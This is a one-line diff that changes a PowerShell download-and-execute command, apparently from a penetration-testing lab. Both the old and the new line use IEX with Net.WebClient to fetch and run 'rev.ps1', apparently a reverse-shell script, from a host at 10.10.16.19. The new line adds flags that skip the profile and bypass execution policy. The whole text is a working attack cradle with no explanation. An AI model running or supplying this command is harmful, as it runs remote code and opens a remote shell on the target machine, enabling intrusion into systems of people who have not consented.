@@ -1,1 +1,1 @@
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.19/rev.ps1')"
+powershell.exe -nop -ep bypass "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.19:8000/rev.ps1')"
